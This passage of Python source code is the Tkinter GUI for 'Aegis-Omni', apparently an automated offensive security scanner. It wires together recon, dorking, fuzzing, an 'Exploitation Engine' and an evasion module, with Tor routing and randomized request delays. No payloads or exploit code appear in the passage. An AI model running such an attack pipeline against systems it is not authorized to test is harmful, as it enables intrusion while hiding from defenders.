        self.delay_max_var = tk.DoubleVar(value=self.config.get("settings.request_delay_max"))
        ttk.Entry(delay_frame, textvariable=self.delay_min_var, width=5).pack(side="left")
        ttk.Label(delay_frame, text="-").pack(side="left")
        ttk.Entry(delay_frame, textvariable=self.delay_max_var, width=5).pack(side="left")

        # Playwright Enable
        self.playwright_var = tk.BooleanVar(value=self.config.get("settings.enable_playwright"))
        ttk.Checkbutton(general_settings_frame, text="Enable Playwright (for advanced dorking/XSS validation)", variable=self.playwright_var).grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky="w")

        # Tor Enable
        self.tor_var = tk.BooleanVar(value=self.config.get("settings.enable_tor"))
        ttk.Checkbutton(general_settings_frame, text="Enable Tor (requires Tor proxy running locally)", variable=self.tor_var).grid(row=3, column=0, columnspan=2, padx=5, pady=5, sticky="w")

        # Theme selection
        ttk.Label(general_settings_frame, text="Theme:").grid(row=4, column=0, padx=5, pady=5, sticky="w")
        self.theme_var = tk.StringVar(value=self.config.get("theme"))
        ttk.Radiobutton(general_settings_frame, text="Dark", variable=self.theme_var, value="dark", command=lambda: self.apply_theme("dark")).grid(row=4, column=1, padx=5, pady=5, sticky="w")
        ttk.Radiobutton(general_settings_frame, text="Light", variable=self.theme_var, value="light", command=lambda: self.apply_theme("light")).grid(row=4, column=2, padx=5, pady=5, sticky="w")

        btn_save = ttk.Button(settings_frame, text="Save and Apply Settings", command=self.save_settings)
        btn_save.pack(pady=20)

    def save_settings(self):
        """Saves current settings from the GUI to the config file."""
        for key, entry in self.api_entries.items():
            self.config.set(f"api_keys.{key}", entry.get())
        
        self.config.set("settings.concurrency", self.concurrency_var.get())
        self.config.set("settings.request_delay_min", self.delay_min_var.get())
        self.config.set("settings.request_delay_max", self.delay_max_var.get())
        self.config.set("settings.enable_playwright", self.playwright_var.get())
        self.config.set("settings.enable_tor", self.tor_var.get())
        self.config.set("theme", self.theme_var.get())

        self.config.save()
        self.apply_theme(self.config.get("theme")) # Apply theme immediately
        messagebox.showinfo("Aegis-Omni", "Configuration updated successfully!")
        self.logger.info("Configuration settings saved and applied.")

    def update_stats_display(self):
        """Updates the dashboard statistics labels."""
        target_domain = self.target_entry.get()
        if target_domain:
            cursor = self.db.conn.cursor()
            cursor.execute("SELECT id FROM targets WHERE domain = ?", (target_domain,))
            target_id = cursor.fetchone()
            if target_id:
                target_id = target_id[0]
                cursor.execute("SELECT COUNT(*) FROM subdomains WHERE target_id = ?", (target_id,))
                self.stat_subs.config(text=f"Subdomains Found: {cursor.fetchone()[0]}")
                cursor.execute("SELECT COUNT(*) FROM urls WHERE target_id = ?", (target_id,))
                self.stat_urls.config(text=f"URLs Discovered: {cursor.fetchone()[0]}")
                cursor.execute("SELECT COUNT(*) FROM vulnerabilities WHERE target_id = ? AND confirmed = 1", (target_id,))
                self.stat_vulns.config(text=f"Vulnerabilities Confirmed: {cursor.fetchone()[0]}")
        self.root.after(2000, self.update_stats_display) # Update every 2 seconds

    def update_subdomains_view(self, target_id):
        """Refreshes the subdomains Treeview with data from the database."""
        for i in self.sub_tree.get_children():
            self.sub_tree.delete(i)
        for row in self.db.get_subdomains_for_target(target_id):
            self.sub_tree.insert("", "end", values=(row["subdomain"], row["ip"], row["source"], row["resolved_at"]))

    def update_dork_results_view(self, target_id):
        """Refreshes the dorking results Treeview."""
        for i in self.dork_tree.get_children():
            self.dork_tree.delete(i)
        for row in self.db.get_urls_for_target(target_id):
            if row["source"] == "Dorking":
                self.dork_tree.insert("", "end", values=(row["url"], row["source"], row["status_code"]))

    def update_fuzzing_results_view(self, target_id):
        """Refreshes the fuzzing results Treeview."""
        for i in self.fuzz_tree.get_children():
            self.fuzz_tree.delete(i)
        for row in self.db.get_urls_for_target(target_id):
            if row["source"] == "Fuzzing":
                self.fuzz_tree.insert("", "end", values=("Discovered Path/Param", row["url"], row["status_code"]))

    def update_vulnerabilities_view(self, target_id):
        """Refreshes the vulnerabilities Treeview."""
        for i in self.vuln_tree.get_children():
            self.vuln_tree.delete(i)
        for row in self.db.get_vulnerabilities_for_target(target_id):
            self.vuln_tree.insert("", "end", values=(row["type"], row["url"], row["severity"], row["description"], 'Yes' if row["confirmed"] else 'No'))

    def start_full_scan(self):
        """Initiates a full scan pipeline in a separate thread."""
        target_domain = self.target_entry.get().strip()
        if not target_domain:
            messagebox.showwarning("Input Error", "Please enter a target domain.")
            return
        
        self.btn_start.config(state="disabled")
        self.btn_stop.config(state="normal")
        self.btn_report.config(state="disabled")
        self.logger.info(f"Initiating full scan for: {target_domain}")
        
        # Clear previous results in GUI
        for tree in [self.sub_tree, self.dork_tree, self.fuzz_tree, self.exploit_tree, self.vuln_tree]:
            for i in tree.get_children():
                tree.delete(i)

        # Run the scan in a new thread to keep GUI responsive
        self.current_scan_task = threading.Thread(target=self.run_pipeline_thread, args=(target_domain,), daemon=True)
        self.current_scan_task.start()

    def stop_scan(self):
        """Stops the currently running scan."""
        if self.current_scan_task and self.current_scan_task.is_alive():
            self.logger.info("Attempting to stop scan. Please wait...")
            # This is a soft stop. For hard stop, asyncio tasks would need to be cancelled.
            # For now, setting a flag that modules can check.
            # A more robust solution would involve cancelling asyncio tasks directly.
            self.stop_scan_flag = True 
            self.btn_stop.config(state="disabled")
        else:
            self.logger.info("No active scan to stop.")

    def run_pipeline_thread(self, domain):
        """Wrapper to run the asyncio pipeline in a separate thread."""
        self.stop_scan_flag = False
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.full_scan_pipeline(domain))
        except asyncio.CancelledError:
            self.logger.info("Scan pipeline cancelled.")
        except Exception as e:
            self.logger.error(f"Scan pipeline error: {e}")
        finally:
            loop.close()
            self.root.after(0, self.on_scan_complete) # Update GUI on main thread

    async def full_scan_pipeline(self, domain):
        """Executes the full offensive security pipeline asynchronously."""
        self.logger.info(f"[Pipeline] Starting full scan for {domain}")
        target_id = self.db.add_target(domain)

        # Initialize evasion module (mostly config setup)
        await self.evasion_module.run()
        await self.ml_module.run()

        # Phase 1: Reconnaissance
        self.logger.info("[Pipeline] Phase 1: Reconnaissance (The Eye)")
        discovered_subdomains = await self.recon_module.run(domain, target_id)
        self.root.after(0, lambda: self.update_subdomains_view(target_id))
        if self.stop_scan_flag: return

        # Get all URLs from subdomains for further processing
        all_urls_to_scan = set()
        for sub in discovered_subdomains:
            all_urls_to_scan.add(f"http://{sub}")
            all_urls_to_scan.add(f"https://{sub}")
        
        # Phase 2: Dorking & OSINT
        self.logger.info("[Pipeline] Phase 2: Dorking & OSINT (The Ghost)")
        # Simplified tech stack for dorking, could be derived from recon_module.technology_fingerprinting results
        tech_stack = ["nginx", "apache", "php", "javascript"]
        dork_urls = await self.dorking_module.run(domain, target_id, tech_stack)
        for url in dork_urls: # Add dorked URLs to the main scan list
            all_urls_to_scan.add(url)
        self.root.after(0, lambda: self.update_dork_results_view(target_id))
        if self.stop_scan_flag: return

        # Phase 3: Fuzzing & Header Chaos
        self.logger.info("[Pipeline] Phase 3: Fuzzing & Header Chaos (The Driller)")
        await self.fuzzing_module.run(list(all_urls_to_scan), target_id)
        self.root.after(0, lambda: self.update_fuzzing_results_view(target_id))
        if self.stop_scan_flag: return

        # Phase 4: Exploitation Engine
        self.logger.info("[Pipeline] Phase 4: Exploitation Engine (The Striker)")
        # Get all URLs from DB for exploitation (including those from fuzzing/dorking)
        urls_from_db = [row["url"] for row in self.db.get_urls_for_target(target_id)]
        await self.exploit_module.run(urls_from_db, target_id)
        self.root.after(0, lambda: self.update_vulnerabilities_view(target_id))
        if self.stop_scan_flag: return

        # Phase 5: Zero-False-Positive Validator (implicitly used by ExploitModule for confirmation)
        self.logger.info("[Pipeline] Phase 5: Zero-False-Positive Validator (The Brain) - Integrated.")
        # The validator module's methods are called directly by the exploit module for confirmation.
        # No separate run() call here, but its logic is crucial.

        self.logger.info(f"[Pipeline] Full scan for {domain} completed.")

    def on_scan_complete(self):
        """Callback executed on the main GUI thread when a scan completes."""
        self.btn_start.config(state="normal")
        self.btn_stop.config(state="disabled")
        self.btn_report.config(state="normal")
        self.logger.info("Scan process finished. You can now generate reports.")
        self.update_stats_display()

    def generate_reports(self):
        """Triggers report generation for the current target."""
        target_domain = self.target_entry.get().strip()
        if not target_domain:
            messagebox.showwarning("Input Error", "Please enter a target domain first.")
            return
        
        cursor = self.db.conn.cursor()
        cursor.execute("SELECT id FROM targets WHERE domain = ?", (target_domain,))
        target_id_row = cursor.fetchone()
        if not target_id_row:
            messagebox.showinfo("No Data", "No scan data found for this target to generate reports.")
            return
        target_id = target_id_row[0]

        self.logger.info(f"Generating reports for {target_domain}...")
        # Run reporting in a separate thread to avoid freezing GUI
        threading.Thread(target=self._generate_reports_thread, args=(target_id, target_domain), daemon=True).start()

    def _generate_reports_thread(self, target_id, domain):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            report_paths = loop.run_until_complete(self.reporting_module.run(target_id, domain))
            self.logger.info(f"Reports generated: {report_paths}")
            messagebox.showinfo("Reports Generated", f"Reports saved to the 'reports' directory.\nHTML: {report_paths.get('html')}\nJSON: {report_paths.get('json')}")
        except Exception as e:
            self.logger.error(f"Error generating reports: {e}")
        finally:
            loop.close()

    def on_closing(self):
        """Handles application shutdown, ensuring resources are properly closed."""
        if messagebox.askokcancel("Quit", "Do you want to quit Aegis-Omni?"):
            self.logger.info("Shutting down Aegis-Omni...")
            self.config.save() # Save current config
            self.db.close() # Close database connection
            # Attempt to gracefully stop any running scan
            if self.current_scan_task and self.current_scan_task.is_alive():
                self.stop_scan_flag = True # Signal to stop
                # Give some time for tasks to finish, or force quit after a delay
                self.logger.warning("Active scan detected. Attempting graceful shutdown. Please wait.")
                # In a real app, you'd join the thread with a timeout or use more robust cancellation
            self.root.destroy()
            sys.exit(0)

# --- Main Execution Block ---

if __name__ == "__main__":
    # Create wordlists directory if it doesn't exist
    os.makedirs("wordlists", exist_ok=True)
    # Create dummy wordlists if they don't exist
    for wl_name in ["common.txt", "dirs.txt", "files.txt", "params.txt", "subdomains.txt"]:
        wl_path = os.path.join("wordlists", wl_name)
        if not os.path.exists(wl_path):
            with open(wl_path, "w") as f:
                f.write(f"test\nadmin\napi\n{wl_name.replace('.txt', '')}_entry\n")
            print(f"Created dummy wordlist: {wl_path}")

    root = tk.Tk()
    app = AegisApp(root)
    root.mainloop()
